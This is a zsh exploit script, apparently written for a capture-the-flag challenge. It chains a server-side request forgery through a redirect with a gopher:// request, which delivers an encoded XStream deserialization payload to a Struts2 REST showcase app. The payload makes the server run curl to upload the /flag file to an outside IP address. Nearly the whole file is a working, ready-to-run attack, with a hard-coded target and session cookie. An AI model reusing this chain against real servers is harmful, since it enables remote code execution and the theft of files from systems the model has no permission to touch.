#!/usr/bin/env zsh

# Author : Virink <virink@outlook.com>
# Date   : 2019/06/13, 23:13


# curl 'https://106.75.24.88:8006/market.php?url=https://where_is_my_cat.ichunqiu.com/redirect.php?u=http://127.0.0.1:8080/?cat.jpg' \
# -H 'Connection: keep-alive' \
# -H 'Pragma: no-cache' \
# -H 'Cache-Control: no-cache' \
# -H 'Upgrade-Insecure-Requests: 1' \
# -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3683.103 Safari/524.63' \
# -H 'DNT: 1' \
# -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' \
# -H 'Accept-Encoding: gzip, deflate, br' \
# -H 'Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,zh-TW;q=0.7' \
# -H 'Cookie: HOST=where_is_my_cat.ichunqiu.com; PHPSESSID=a964f0hegssd12k1go765kom30' \
# --compressed --insecure 

function fuck(){
    local url=$1
    curl -q -k -s "https://106.75.24.88:8006/market.php?url=https://where_is_my_cat.ichunqiu.com/redirect.php?u=$url&x=cat.jpg" \
    -H 'Connection: keep-alive' \
    -H 'Pragma: no-cache' \
    -H 'Cache-Control: no-cache' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3683.103 Safari/524.63' \
    -H 'DNT: 1' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' \
    -H 'Accept-Encoding: gzip, deflate, br' \
    -H 'Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,zh-TW;q=0.7' \
    -H 'Cookie: HOST=where_is_my_cat.ichunqiu.com; PHPSESSID=a964f0hegssd12k1go765kom30' \
    --compressed --insecure --output -
}

# a=$(fuck 'http://127.0.0.1:8080/?cat.jpg')
# echo $a | grep -o -E "base64,(.*?)\"" | cut -f 2 -d "," | cut -f 1 -d "\"" | base64 -D
# 
# a=$(fuck 'http://127.0.0.1:8080/struts2-rest-showcase/orders.xhtml?cat.jpg')
# echo $a | grep -o -E "base64,(.*?)\"" | cut -f 2 -d "," | cut -f 1 -d "\"" | base64 -D

u="gopher://127.0.0.1:8080/xPOST%2520%252Fstruts2-rest-showcase281%252Forders%252F%2520HTTP%252F1.1%250AHost%253A%2520127.0.0.1%253A8080%250AAccept%253A%2520%252A%252F%252A%250AContent-Type%253A%2520application%252Fxml%250AContent-Length%253A%25201628%250A%250A%253Cmap%253E%253Centry%253E%253Cjdk.nashorn.internal.objects.NativeString%253E%253Cflags%253E0%253C%252Fflags%253E%253Cvalue%2520class%253D%2522com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data%2522%253E%253CdataHandler%253E%253CdataSource%2520class%253D%2522com.sun.xml.internal.ws.encoding.xml.XMLMessage%2524XmlDataSource%2522%253E%253Cis%2520class%253D%2522javax.crypto.CipherInputStream%2522%253E%253Ccipher%2520class%253D%2522javax.crypto.NullCipher%2522%253E%253Cinitialized%253Efalse%253C%252Finitialized%253E%253Copmode%253E0%253C%252Fopmode%253E%253CserviceIterator%2520class%253D%2522javax.imageio.spi.FilterIterator%2522%253E%253Citer%2520class%253D%2522javax.imageio.spi.FilterIterator%2522%253E%253Citer%2520class%253D%2522java.util.Collections%2524EmptyIterator%2522%252F%253E%253Cnext%2520class%253D%2522java.lang.ProcessBuilder%2522%253E%253Ccommand%253E%253Cstring%253Ecurl%253C%252Fstring%253E%253Cstring%253E114.55.243.1%253A8899%253C%252Fstring%253E%253Cstring%253E-F%253C%252Fstring%253E%253Cstring%253Ef%253D%2540%252Fflag%253C%252Fstring%253E%253C%252Fcommand%253E%253CredirectErrorStream%253Efalse%253C%252FredirectErrorStream%253E%253C%252Fnext%253E%253C%252Fiter%253E%253Cfilter%2520class%253D%2522javax.imageio.ImageIO%2524ContainsFilter%2522%253E%253Cmethod%253E%253Cclass%253Ejava.lang.ProcessBuilder%253C%252Fclass%253E%253Cname%253Estart%253C%252Fname%253E%253Cparameter-types%252F%253E%253C%252Fmethod%253E%253Cname%253Efoo%253C%252Fname%253E%253C%252Ffilter%253E%253Cnext%2520class%253D%2522string%2522%253Efoo%253C%252Fnext%253E%253C%252FserviceIterator%253E%253Clock%252F%253E%253C%252Fcipher%253E%253Cinput%2520class%253D%2522java.lang.ProcessBuilder%2524NullInputStream%2522%252F%253E%253Cibuffer%252F%253E%253Cdone%253Efalse%253C%252Fdone%253E%253Costart%253E0%253C%252Fostart%253E%253Cofinish%253E0%253C%252Fofinish%253E%253Cclosed%253Efalse%253C%252Fclosed%253E%253C%252Fis%253E%253Cconsumed%253Efalse%253C%252Fconsumed%253E%253C%252FdataSource%253E%253CtransferFlavors%252F%253E%253C%252FdataHandler%253E%253CdataLen%253E0%253C%252FdataLen%253E%253C%252Fvalue%253E%253C%252Fjdk.nashorn.internal.objects.NativeString%253E%253Cjdk.nashorn.internal.objects.NativeString%2520reference%253D%2522..%252Fjdk.nashorn.internal.objects.NativeString%2522%252F%253E%253C%252Fentry%253E%253Centry%253E%253Cjdk.nashorn.internal.objects.NativeString%2520reference%253D%2522..%252F..%252Fentry%252Fjdk.nashorn.internal.objects.NativeString%2522%252F%253E%253Cjdk.nashorn.internal.objects.NativeString%2520reference%253D%2522..%252F..%252Fentry%252Fjdk.nashorn.internal.objects.NativeString%2522%252F%253E%253C%252Fentry%253E%253C%252Fmap%253E"
# echo $u
echo "https://106.75.24.88:8006/market.php?url=https://where_is_my_cat.ichunqiu.com/redirect.php?u=$u&x=cat.jpg"
# fuck $u
# a=$(fuck $u)
# echo $a
# echo $a | grep -o -E "base64,(.*?)\"" | cut -f 2 -d "," | cut -f 1 -d "\"" | base64 -D



